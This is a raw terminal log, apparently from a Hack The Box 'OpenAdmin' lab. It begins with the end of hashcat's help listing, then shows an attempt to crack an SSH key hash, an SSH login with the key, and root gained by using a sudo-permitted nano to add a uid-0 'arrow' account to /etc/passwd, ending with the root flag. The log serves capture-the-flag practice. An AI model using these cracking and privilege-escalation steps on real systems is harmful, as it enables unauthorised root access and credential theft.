+   8800 | Android FDE <= 4.3                               | Full-Disk Encryption (FDE)                                                                                       
+  12900 | Android FDE (Samsung DEK)                        | Full-Disk Encryption (FDE)                                                                                       
+  12200 | eCryptfs                                         | Full-Disk Encryption (FDE)                                                                                       
+  137XY | VeraCrypt                                        | Full-Disk Encryption (FDE)                                                                                       
+     X  | 1 = PBKDF2-HMAC-RIPEMD160                        | Full-Disk Encryption (FDE)                                                                                       
+     X  | 2 = PBKDF2-HMAC-SHA512                           | Full-Disk Encryption (FDE)                                                                                       
+     X  | 3 = PBKDF2-HMAC-Whirlpool                        | Full-Disk Encryption (FDE)                                                                                       
+     X  | 4 = PBKDF2-HMAC-RIPEMD160 + boot-mode            | Full-Disk Encryption (FDE)                                                                                       
+     X  | 5 = PBKDF2-HMAC-SHA256                           | Full-Disk Encryption (FDE)                                                                                       
+     X  | 6 = PBKDF2-HMAC-SHA256 + boot-mode               | Full-Disk Encryption (FDE)                                                                                       
+     X  | 7 = PBKDF2-HMAC-Streebog-512                     | Full-Disk Encryption (FDE)                                                                                       
+      Y | 1 = XTS  512 bit pure AES                        | Full-Disk Encryption (FDE)                                                                                       
+      Y | 1 = XTS  512 bit pure Serpent                    | Full-Disk Encryption (FDE)                                                                                       
+      Y | 1 = XTS  512 bit pure Twofish                    | Full-Disk Encryption (FDE)                                                                                       
+      Y | 1 = XTS  512 bit pure Camellia                   | Full-Disk Encryption (FDE)                                                                                       
+      Y | 1 = XTS  512 bit pure Kuznyechik                 | Full-Disk Encryption (FDE)                                                                                       
+      Y | 2 = XTS 1024 bit pure AES                        | Full-Disk Encryption (FDE)                                                                                       
+      Y | 2 = XTS 1024 bit pure Serpent                    | Full-Disk Encryption (FDE)                                                                                       
+      Y | 2 = XTS 1024 bit pure Twofish                    | Full-Disk Encryption (FDE)                                                                                       
+      Y | 2 = XTS 1024 bit pure Camellia                   | Full-Disk Encryption (FDE)                                                                                       
+      Y | 2 = XTS 1024 bit pure Kuznyechik                 | Full-Disk Encryption (FDE)                                                                                       
+      Y | 2 = XTS 1024 bit cascaded AES-Twofish            | Full-Disk Encryption (FDE)                                                                                       
+      Y | 2 = XTS 1024 bit cascaded Camellia-Kuznyechik    | Full-Disk Encryption (FDE)                                                                                       
+      Y | 2 = XTS 1024 bit cascaded Camellia-Serpent       | Full-Disk Encryption (FDE)                                                                                       
+      Y | 2 = XTS 1024 bit cascaded Kuznyechik-AES         | Full-Disk Encryption (FDE)                                                                                       
+      Y | 2 = XTS 1024 bit cascaded Kuznyechik-Twofish     | Full-Disk Encryption (FDE)                                                                                       
+      Y | 2 = XTS 1024 bit cascaded Serpent-AES            | Full-Disk Encryption (FDE)                                                                                       
+      Y | 2 = XTS 1024 bit cascaded Twofish-Serpent        | Full-Disk Encryption (FDE)                                                                                       
+      Y | 3 = XTS 1536 bit all                             | Full-Disk Encryption (FDE)                                                                                       
+  14600 | LUKS                                             | Full-Disk Encryption (FDE)                                                                                       
+  16700 | FileVault 2                                      | Full-Disk Encryption (FDE)                                                                                       
+  18300 | Apple File System (APFS)                         | Full-Disk Encryption (FDE)                                                                                       
+   9700 | MS Office <= 2003 $0/$1, MD5 + RC4               | Documents                 
+   9710 | MS Office <= 2003 $0/$1, MD5 + RC4, collider #1  | Documents                 
+   9720 | MS Office <= 2003 $0/$1, MD5 + RC4, collider #2  | Documents                 
+   9800 | MS Office <= 2003 $3/$4, SHA1 + RC4              | Documents                 
+   9810 | MS Office <= 2003 $3, SHA1 + RC4, collider #1    | Documents                 
+   9820 | MS Office <= 2003 $3, SHA1 + RC4, collider #2    | Documents                 
+   9400 | MS Office 2007                                   | Documents                 
+   9500 | MS Office 2010                                   | Documents                 
+   9600 | MS Office 2013                                   | Documents                 
+  10400 | PDF 1.1 - 1.3 (Acrobat 2 - 4)                    | Documents                 
+  10410 | PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #1       | Documents                 
+  10420 | PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #2       | Documents                 
+  10500 | PDF 1.4 - 1.6 (Acrobat 5 - 8)                    | Documents                 
+  10600 | PDF 1.7 Level 3 (Acrobat 9)                      | Documents                 
+  10700 | PDF 1.7 Level 8 (Acrobat 10 - 11)                | Documents                 
+  16200 | Apple Secure Notes                               | Documents                 
+   9000 | Password Safe v2                                 | Password Managers         
+   5200 | Password Safe v3                                 | Password Managers         
+   6800 | LastPass + LastPass sniffed                      | Password Managers         
+   6600 | 1Password, agilekeychain                         | Password Managers         
+   8200 | 1Password, cloudkeychain                         | Password Managers         
+  11300 | Bitcoin/Litecoin wallet.dat                      | Password Managers         
+  12700 | Blockchain, My Wallet                            | Password Managers         
+  15200 | Blockchain, My Wallet, V2                        | Password Managers         
+  16600 | Electrum Wallet (Salt-Type 1-3)                  | Password Managers         
+  13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES)      | Password Managers         
+  15500 | JKS Java Key Store Private Keys (SHA1)           | Password Managers         
+  15600 | Ethereum Wallet, PBKDF2-HMAC-SHA256              | Password Managers         
+  15700 | Ethereum Wallet, SCRYPT                          | Password Managers         
+  16300 | Ethereum Pre-Sale Wallet, PBKDF2-HMAC-SHA256     | Password Managers         
+  16900 | Ansible Vault                                    | Password Managers         
+  18100 | TOTP (HMAC-SHA1)                                 | One-Time Passwords        
+  99999 | Plaintext                                        | Plaintext                 
+
+- [ Brain Client Features ] -              
+
+  # | Features                             
+ ===+========                              
+  1 | Send hashed passwords                
+  2 | Send attack positions                
+  3 | Send hashed passwords and attack positions                                       
+
+- [ Outfile Formats ] -                    
+
+  # | Format                               
+ ===+========                              
+  1 | hash[:salt]                          
+  2 | plain                                
+  3 | hash[:salt]:plain                    
+  4 | hex_plain                            
+  5 | hash[:salt]:hex_plain                
+  6 | plain:hex_plain                      
+  7 | hash[:salt]:plain:hex_plain          
+  8 | crackpos                             
+  9 | hash[:salt]:crack_pos                
+ 10 | plain:crack_pos                      
+ 11 | hash[:salt]:plain:crack_pos          
+ 12 | hex_plain:crack_pos                  
+ 13 | hash[:salt]:hex_plain:crack_pos      
+ 14 | plain:hex_plain:crack_pos            
+ 15 | hash[:salt]:plain:hex_plain:crack_pos                                            
+
+- [ Rule Debugging Modes ] -               
+
+  # | Format                               
+ ===+========                              
+  1 | Finding-Rule                         
+  2 | Original-Word                        
+  3 | Original-Word:Finding-Rule           
+  4 | Original-Word:Finding-Rule:Processed-Word                                        
+
+- [ Attack Modes ] -                       
+
+  # | Mode                                 
+ ===+======                                
+  0 | Straight                             
+  1 | Combination                          
+  3 | Brute-force                          
+  6 | Hybrid Wordlist + Mask               
+  7 | Hybrid Mask + Wordlist               
+
+- [ Built-in Charsets ] -                  
+
+  ? | Charset                              
+ ===+=========                             
+  l | abcdefghijklmnopqrstuvwxyz           
+  u | ABCDEFGHIJKLMNOPQRSTUVWXYZ           
+  d | 0123456789                           
+  h | 0123456789abcdef                     
+  H | 0123456789ABCDEF                     
+  s |  !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~    
+  a | ?l?u?d?s                             
+  b | 0x00 - 0xff                          
+
+- [ OpenCL Device Types ] -                
+
+  # | Device Type                          
+ ===+=============                         
+  1 | CPU                                  
+  2 | GPU                                  
+  3 | FPGA, DSP, Co-Processor              
+
+- [ Workload Profiles ] -                  
+
+  # | Performance | Runtime | Power Consumption | Desktop Impact                       
+ ===+=============+=========+===================+=================                     
+  1 | Low         |   2 ms  | Low               | Minimal                              
+  2 | Default     |  12 ms  | Economic          | Noticeable                           
+  3 | High        |  96 ms  | High              | Unresponsive                         
+  4 | Nightmare   | 480 ms  | Insane            | Headless                             
+
+- [ Basic Examples ] -                     
+
+  Attack-          | Hash- |               
+  Mode             | Type  | Example command                                           
+ ==================+=======+==================================================================                                                                                
+  Wordlist         | $P$   | hashcat -a 0 -m 400 example400.hash example.dict          
+  Wordlist + Rules | MD5   | hashcat -a 0 -m 0 example0.hash example.dict -r rules/best64.rule                                                                                
+  Brute-Force      | MD5   | hashcat -a 3 -m 0 example0.hash ?a?a?a?a?a?a              
+  Combinator       | MD5   | hashcat -a 1 -m 0 example0.hash example.dict example.dict 
+
+If you still have no idea what just happened, try the following pages:                 
+
+* https://hashcat.net/wiki/#howtos_videos_papers_articles_etc_in_the_wild              
+* https://hashcat.net/faq/                 
+┌─[root@parrot]─[~/hackthebox/openadmin]   
+└──╼ #hashcat -m 16700 joanna.hash /opt/wordlists/rockyou.txt --force                                                                                                         
+hashcat (v5.1.0) starting...               
+
+OpenCL Platform #1: The pocl project       
+====================================       
+* Device #1: pthread-Intel(R) Core(TM) i5-7300HQ CPU @ 2.50GHz, 512/1493 MB allocatable, 2MCU                                                                                 
+
+Hashfile 'joanna.hash' on line 1 (/root/...21c3f88c2a1a484d62d602903793d10d): Signature unmatched                                                                             
+No hashes loaded.                          
+
+Started: Fri Jan 10 14:59:55 2020          
+Stopped: Fri Jan 10 14:59:57 2020          
+┌─[✗]─[root@parrot]─[~/hackthebox/openadmin]                                           
+└──╼ #vi creds                             
+┌─[root@parrot]─[~/hackthebox/openadmin]   
+└──╼ #ssh -i joanna joanna@10.10.10.171    
+Enter passphrase for key 'joanna':         
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)                     
+
+ * Documentation:  https://help.ubuntu.com 
+ * Management:     https://landscape.canonical.com                                     
+ * Support:        https://ubuntu.com/advantage                                        
+
+  System information as of Sat Jan 11 02:45:18 UTC 2020                                
+
+  System load:  0.0               Processes:             135                           
+  Usage of /:   49.4% of 7.81GB   Users logged in:       1                             
+  Memory usage: 32%               IP address for ens160: 10.10.10.171                  
+  Swap usage:   0%                         
+
+
+ * Canonical Livepatch is available for installation.                                  
+   - Reduce system reboots and improve kernel security. Activate at:                   
+     https://ubuntu.com/livepatch          
+
+41 packages can be updated.                
+12 updates are security updates.           
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings                                                         
+
+
+Last login: Fri Jan 10 16:46:36 2020 from 10.10.14.23                                  
+joanna@openadmin:~$ ls                     
+user.txt                                   
+joanna@openadmin:~$ cat user.txt           
+c9b2cf07d40807e62af62660f0c81b5f           
+joanna@openadmin:~$ sudo -l                
+Matching Defaults entries for joanna on openadmin:                                     
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin                                                         
+
+User joanna may run the following commands on openadmin:                               
+    (ALL) NOPASSWD: /bin/nano /opt/priv    
+joanna@openadmin:~$ cd /opt/               
+joanna@openadmin:/opt$ cd /priv            
+-bash: cd: /priv: No such file or directory                                            
+joanna@openadmin:/opt$ cd priv             
+-bash: cd: priv: Not a directory           
+joanna@openadmin:/opt$ cat priv            
+joanna@openadmin:/opt$ less priv           
+joanna@openadmin:/opt$ ls -la              
+total 12                                   
+drwxr-xr-x  3 root     root     4096 Jan 10 17:19 .                                    
+drwxr-xr-x 24 root     root     4096 Nov 21 13:41 ..                                   
+drwxr-x---  7 www-data www-data 4096 Nov 21 18:23 ona                                  
+-rw-r--r--  1 root     root        0 Nov 22 23:49 priv                                 
+joanna@openadmin:/opt$ vi priv             
+joanna@openadmin:/opt$ ls -la              
+total 12                                   
+drwxr-xr-x  3 root     root     4096 Jan 10 17:19 .                                    
+drwxr-xr-x 24 root     root     4096 Nov 21 13:41 ..                                   
+drwxr-x---  7 www-data www-data 4096 Nov 21 18:23 ona                                  
+-rw-r--r--  1 root     root        0 Nov 22 23:49 priv                                 
+joanna@openadmin:/opt$ cd /bin/nano        
+-bash: cd: /bin/nano: Not a directory      
+joanna@openadmin:/opt$ cd /bin             
+joanna@openadmin:/bin$ echo $PATH          
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin                                                                            
+joanna@openadmin:/bin$ which nano          
+/bin/nano                                  
+joanna@openadmin:/bin$ ls -la nano         
+-rwxr-xr-x 1 root root 245872 Mar  6  2018 nano                                        
+joanna@openadmin:/bin$ nano bashing.sh     
+joanna@openadmin:/bin$                     
+joanna@openadmin:/bin$ cd /dev/shm         
+joanna@openadmin:/dev/shm$ mount | grep dev
+sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)                             
+proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)                              
+udev on /dev type devtmpfs (rw,nosuid,relatime,size=989376k,nr_inodes=247344,mode=755) 
+devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000) 
+/dev/sda2 on / type ext4 (rw,relatime,data=ordered)                                    
+securityfs on /sys/kernel/security type securityfs (rw,nosuid,nodev,noexec,relatime)   
+tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)                                         
+tmpfs on /run/lock type tmpfs (rw,nosuid,nodev,noexec,relatime,size=5120k)             
+tmpfs on /sys/fs/cgroup type tmpfs (ro,nosuid,nodev,noexec,mode=755)                   
+cgroup on /sys/fs/cgroup/unified type cgroup2 (rw,nosuid,nodev,noexec,relatime)        
+cgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,name=systemd)                                                                             
+pstore on /sys/fs/pstore type pstore (rw,nosuid,nodev,noexec,relatime)                 
+cgroup on /sys/fs/cgroup/pids type cgroup (rw,nosuid,nodev,noexec,relatime,pids)       
+cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,cpu,cpuacct)                                                                                
+cgroup on /sys/fs/cgroup/freezer type cgroup (rw,nosuid,nodev,noexec,relatime,freezer) 
+cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (rw,nosuid,nodev,noexec,relatime,net_cls,net_prio)                                                                      
+cgroup on /sys/fs/cgroup/perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,perf_event)                                                                                  
+cgroup on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,blkio)     
+cgroup on /sys/fs/cgroup/rdma type cgroup (rw,nosuid,nodev,noexec,relatime,rdma)       
+cgroup on /sys/fs/cgroup/hugetlb type cgroup (rw,nosuid,nodev,noexec,relatime,hugetlb) 
+cgroup on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,cpuset)   
+cgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices) 
+cgroup on /sys/fs/cgroup/memory type cgroup (rw,nosuid,nodev,noexec,relatime,memory)   
+mqueue on /dev/mqueue type mqueue (rw,relatime)                                        
+hugetlbfs on /dev/hugepages type hugetlbfs (rw,relatime,pagesize=2M)                   
+/var/lib/snapd/snaps/core_7270.snap on /snap/core/7270 type squashfs (ro,nodev,relatime,x-gdu.hide)                                                                           
+/var/lib/snapd/snaps/core_8039.snap on /snap/core/8039 type squashfs (ro,nodev,relatime,x-gdu.hide)                                                                           
+lxcfs on /var/lib/lxcfs type fuse.lxcfs (rw,nosuid,nodev,relatime,user_id=0,group_id=0,allow_other)                                                                           
+tmpfs on /run/user/1000 type tmpfs (rw,nosuid,nodev,relatime,size=204156k,mode=700,uid=1000,gid=1000)                                                                         
+tmpfs on /run/user/1001 type tmpfs (rw,nosuid,nodev,relatime,size=204156k,mode=700,uid=1001,gid=1001)                                                                         
+joanna@openadmin:/dev/shm$ cd /opt/        
+joanna@openadmin:/opt$ nano priv           
+joanna@openadmin:/opt$ ls                  
+ona  priv                                  
+joanna@openadmin:/opt$ ls -la              
+total 12                                   
+drwxr-xr-x  3 root     root     4096 Jan 10 17:19 .                                    
+drwxr-xr-x 24 root     root     4096 Nov 21 13:41 ..                                   
+drwxr-x---  7 www-data www-data 4096 Nov 21 18:23 ona                                  
+-rw-r--r--  1 root     root        0 Nov 22 23:49 priv                                 
+joanna@openadmin:/opt$ nano privi          
+joanna@openadmin:/opt$ cd /dev/shm         
+joanna@openadmin:/dev/shm$ nano privi      
+joanna@openadmin:/dev/shm$ ls              
+privi                                      
+joanna@openadmin:/dev/shm$ cat privi       
+#!/bin/bash                                
+echo "giving u bash"                       
+
+/bin/bash                                  
+joanna@openadmin:/dev/shm$ ls -la          
+total 4                                    
+drwxrwxrwt  2 root   root     60 Jan 11 02:56 .                                        
+drwxr-xr-x 18 root   root   3820 Jan 10 13:49 ..                                       
+-rw-rw-r--  1 joanna joanna   44 Jan 11 02:56 privi                                    
+joanna@openadmin:/dev/shm$ echo -n '/bin/bash' > /opt/priv                             
+-bash: /opt/priv: Permission denied        
+joanna@openadmin:/dev/shm$ cd ~            
+joanna@openadmin:~$ nano arrow             
+joanna@openadmin:~$ ls -la                 
+total 48                                   
+drwxr-x--- 6 joanna joanna 4096 Jan 11 02:58 .                                         
+drwxr-xr-x 4 root   root   4096 Nov 22 18:00 ..                                        
+-rw-rw-r-- 1 joanna joanna   23 Jan 11 02:58 arrow                                     
+lrwxrwxrwx 1 joanna joanna    9 Nov 22 18:02 .bash_history -> /dev/null                
+-rw-r--r-- 1 joanna joanna  220 Nov 22 18:00 .bash_logout                              
+-rw-r--r-- 1 joanna joanna 3771 Nov 22 18:00 .bashrc                                   
+drwx------ 2 joanna joanna 4096 Nov 22 22:42 .cache                                    
+drwx------ 3 joanna joanna 4096 Nov 22 22:42 .gnupg                                    
+drwxrwxr-x 3 joanna joanna 4096 Nov 22 18:53 .local                                    
+-rw-r--r-- 1 joanna joanna  807 Nov 22 18:00 .profile                                  
+drwx------ 2 joanna joanna 4096 Nov 23 17:31 .ssh                                      
+-rw-rw-r-- 1 joanna joanna   33 Nov 28 09:37 user.txt                                  
+-rw------- 1 joanna joanna  802 Jan 11 02:50 .viminfo                                  
+joanna@openadmin:~$ sudo -l                
+Matching Defaults entries for joanna on openadmin:                                     
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin                                                         
+
+User joanna may run the following commands on openadmin:                               
+    (ALL) NOPASSWD: /bin/nano /opt/priv    
+joanna@openadmin:~$ sud^C                  
+joanna@openadmin:~$ sudo /bin/nano /opt/priv                                           
+joanna@openadmin:~$ sudo -u arrow          
+usage: sudo -h | -K | -k | -V              
+usage: sudo -v [-AknS] [-g group] [-h host] [-p prompt] [-u user]                      
+usage: sudo -l [-AknS] [-g group] [-h host] [-p prompt] [-U user] [-u user] [command]  
+usage: sudo [-AbEHknPS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-T timeout] [-u user] [VAR=value] [-i|-s] [<command>]                                  
+usage: sudo -e [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-T timeout] [-u user] file ...                                                          
+joanna@openadmin:~$ sudo arrow             
+[sudo] password for joanna:                
+Sorry, try again.                          
+[sudo] password for joanna:                
+Sorry, try again.                          
+[sudo] password for joanna:                
+sudo: 3 incorrect password attempts        
+joanna@openadmin:~$ su                     
+Password:                                  
+su: Authentication failure                 
+joanna@openadmin:~$ su                     
+Password:                                  
+su: Authentication failure                 
+joanna@openadmin:~$ su - arrow             
+Password:                                  
+su: Authentication failure                 
+joanna@openadmin:~$ cat /etc/passwd        
+root:x:0:0:root:/root:/bin/bash            
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin                                        
+bin:x:2:2:bin:/bin:/usr/sbin/nologin       
+sys:x:3:3:sys:/dev:/usr/sbin/nologin       
+sync:x:4:65534:sync:/bin:/bin/sync         
+games:x:5:60:games:/usr/games:/usr/sbin/nologin                                        
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin                                        
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin                                           
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin                                            
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin                                      
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin                                    
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin 
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin                                   
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin                                   
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin                          
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin                                       
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin      
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin                             
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin                                                                                  
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin   
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin                                       
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin                                   
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin                                       
+lxd:x:105:65534::/var/lib/lxd/:/bin/false  
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin                                          
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin                         
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin                              
+pollinate:x:109:1::/var/cache/pollinate:/bin/false                                     
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin                                          
+jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash                                          
+mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false                                
+joanna:x:1001:1001:,,,:/home/joanna:/bin/bash                                          
+arrow:a44ow:0:0:root:/root:/bin/bash       
+joanna@openadmin:~$ su - arrow             
+Password:                                  
+su: Authentication failure                 
+joanna@openadmin:~$ sudo /bin/nano /opt/priv                                                                                                                                  
+joanna@openadmin:~$ su - arrow             
+Password:                                  
+su: Authentication failure                 
+joanna@openadmin:~$ sudo /bin/nano /opt/priv                                           
+joanna@openadmin:~$ less /etc/passwd       
+joanna@openadmin:~$                        
+joanna@openadmin:~$ su - arrow             
+Password:                                  
+root@openadmin:~# ls                       
+root.txt                                   
+root@openadmin:~# cat root.txt             
+2f907ed450b361b2c2bf4e8795d5b561           
+root@openadmin:~# find / -name root.txt    
+/root/root.txt                             
+root@openadmin:~# exit                     
+logout                                     
+joanna@openadmin:~$ exit                   
+logout                                     
+Connection to 10.10.10.171 closed.         
+┌─[root@parrot]─[~/hackthebox/openadmin]   
+└──╼ #                                     
